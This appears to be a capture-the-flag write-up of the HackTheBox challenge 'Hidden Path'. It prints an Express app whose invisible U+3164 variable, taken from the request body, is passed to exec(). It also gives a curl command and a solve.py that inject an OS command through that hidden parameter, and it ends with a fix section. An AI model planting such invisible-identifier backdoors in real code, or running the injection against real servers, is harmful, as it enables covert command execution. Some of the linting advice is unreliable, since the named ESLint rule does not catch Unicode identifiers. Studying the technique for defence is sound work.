---
title: "Hidden Path"
date: 2027-11-19 09:00:00 -0500
categories: [HackTheBox, Challenges, Misc]
tags: [hackthebox, challenge, misc, nodejs, javascript, unicode, command-injection, invisible-identifier, cwe-78]
description: "An easy Misc challenge: a Node.js/Express app hides an invisible Unicode character (U+3164 HANGUL FILLER) as a JavaScript variable name that is destructured from req.body and spliced into an exec() command array — sending the hidden POST parameter injects an arbitrary OS command."
---

## Overview

`Hidden Path` is an easy HackTheBox **Misc** challenge. A Node.js/Express web app exposes a
`/server_status` endpoint that runs one of several pre-approved shell commands (free, uptime,
iostat, etc.) based on a `choice` integer. The twist: a hidden
[U+3164 HANGUL FILLER](https://www.compart.com/en/unicode/U+3164) character — invisible in every
standard editor and terminal — is used as a valid JavaScript identifier, destructured from the
POST body, and injected as an extra element in the command array. Sending it as a named POST
parameter achieves [OS command injection (CWE-78)](https://cwe.mitre.org/data/definitions/78.html).

## The Technique

JavaScript allows any Unicode character classified as `ID_Start` or `ID_Continue` (per the
ECMAScript specification) in an identifier. **U+3164 (HANGUL FILLER, ㅤ) qualifies.** In UTF-8
it is the three-byte sequence `E3 85 A4`, which every standard terminal renders as a blank space.
This makes it effectively invisible during code review.

The vulnerable `app.js` reads:

```javascript
app.post('/server_status', async (req, res) => {
    const { choice,ㅤ} = req.body;   // ㅤ = U+3164 — looks like trailing whitespace
    const integerChoice = +choice;

    const commands = [
        'free -m',   // 0
        'uptime',    // 1
        'iostat',    // 2
        'mpstat',    // 3
        'netstat',   // 4
        'ps aux',    // 5
        ㅤ           // 6 — value comes from req.body; invisible in the source file
    ];

    if (integerChoice < 0 || integerChoice >= commands.length) {
        return res.status(400).send('Invalid choice: out of bounds');
    }

    exec(commands[integerChoice], (error, stdout) => {
        res.status(200).send(stdout);
    });
});
```

Three things chain together:

1. `ㅤ` is destructured from `req.body` — **the attacker controls its value**.
2. It is placed at index 6 of the `commands` array, making `commands.length = 7`.
3. The bounds check `integerChoice >= commands.length` uses 7 (not 6), so `choice=6` passes.
4. `exec(commands[6])` runs whatever string the attacker supplied as the `ㅤ` POST parameter.

The frontend `index.js` never sends this parameter — it only sends `choice` as a radio-button
index. The hidden slot exists entirely for an attacker who reads the source.

## Solution

Identify the invisible character by hex-dumping the source:

```bash
hexdump -C app.js | grep 'e3 85 a4'
```

Then trigger the injection by sending two POST parameters: `choice=6` to select the hidden slot,
and the U+3164 character as a parameter name set to the desired shell command.

```bash
curl -s -X POST "http://<host>:<port>/server_status" \
  --data-urlencode "choice=6" \
  --data-urlencode "ㅤ=cat /www/flag.txt"
```

The `ㅤ` in the second `--data-urlencode` argument is the actual U+3164 character
(URL-encoded on the wire as `%E3%85%A4`). `curl --data-urlencode` sends the parameter name
raw and URL-encodes only the value, but Express's `urlencoded` body parser accepts either form.

The server calls `exec("cat /www/flag.txt")` and returns the flag.

The working `solve.py`:

```python
#!/usr/bin/env python3
"""solve.py — python3 solve.py <host> <port>"""
import sys
import subprocess

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = sys.argv[2] if len(sys.argv) > 2 else "1337"
    url = f"http://{host}:{port}/server_status"
    hidden_var = "ㅤ"  # U+3164 HANGUL FILLER

    result = subprocess.run(
        ["curl", "-s", "-X", "POST", url,
         "--data-urlencode", "choice=6",
         "--data-urlencode", f"{hidden_var}=cat /www/flag.txt"],
        capture_output=True, text=True
    )
    print(result.stdout)

if __name__ == "__main__":
    main()
```

Flag: `HTB{...}` (redacted).

## Why It Worked

The ECMAScript specification explicitly permits Unicode identifier characters beyond ASCII,
including characters that are visually indistinguishable from whitespace. The application's author
added a legitimate-looking POST body parser but never validated the set of accepted parameter names —
the `express.urlencoded` middleware passes every key in the body verbatim, including one with an
invisible name.

The bounds check is mathematically correct but semantically blind: `commands.length` grows by one
whenever `ㅤ` is defined, so the guard does not detect the injection — it merely enforces
"don't exceed the (attacker-extended) length".

The technique is a stealthy form of [OS command injection](https://cwe.mitre.org/data/definitions/78.html):
no traditional shell metacharacter (`;`, `|`, `` ` ``, `$()`) is involved. The entire injection
surface is the hidden parameter name, which most scanners and WAFs will never look for.

## Fix

Never derive the executed command from user-controlled input, even indirectly:

```javascript
// Server-side constant array; user provides only an integer index
const COMMANDS = ['free -m', 'uptime', 'iostat', 'mpstat', 'netstat', 'ps aux'];
const idx = parseInt(req.body.choice, 10);
if (!Number.isInteger(idx) || idx < 0 || idx >= COMMANDS.length) {
    return res.status(400).send('Invalid choice');
}
exec(COMMANDS[idx], (err, stdout) => res.send(stdout));
```

**Additional hardening:**

- Allowlist the exact set of permitted POST body keys and reject extras (an explicit schema
  validator like `joi` or `zod` does this cheaply).
- Lint source files for non-ASCII identifier characters at build time — ESLint's
  `no-irregular-whitespace` rule and a Unicode-identifier restriction flag
  (`--plugin unicorn` / `unicorn/no-keyword-prefix`) catch this class of obfuscation before
  it ships.
- Run `cat -v sourcefile.js` or `hexdump -C sourcefile.js | grep 'e3 85'` in CI to surface
  invisible codepoints in any committed JS file.
